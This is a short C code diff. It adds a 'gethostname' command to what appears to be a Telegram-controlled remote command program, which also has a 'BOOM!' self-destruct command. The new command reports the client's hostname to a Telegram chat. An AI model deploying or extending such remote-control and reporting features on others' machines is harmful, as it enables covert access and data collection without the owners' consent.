@@ -166,7 +166,7 @@ int main(int argc , char *argv[])
     fp = popen("rm error.txt","r");
 }
 void *changecommand(char *id,char *text) {
-    char text_build[4000], command_detail[500];
+    char text_build[4000], command_detail[500],temp_text[2000];
     int start_index, index = 0, length;
 
     strcpy(text_build, text);
@@ -217,6 +217,11 @@ void *changecommand(char *id,char *text) {
         else if(strcmp(text, "BOOM!") == 0) {
             strcpy(command_detail, "DESTROY ITSELF!");
             boom();
+        }
+        else if(strcmp(text, "gethostname") == 0) {
+            strcpy(command_detail, "Get hostname of client.");
+            getHostname(temp_text);
+            telegram_send_msg(id,temp_text);
         }
         printf("%s", command_detail);
         memset(command_detail, 0, 500);
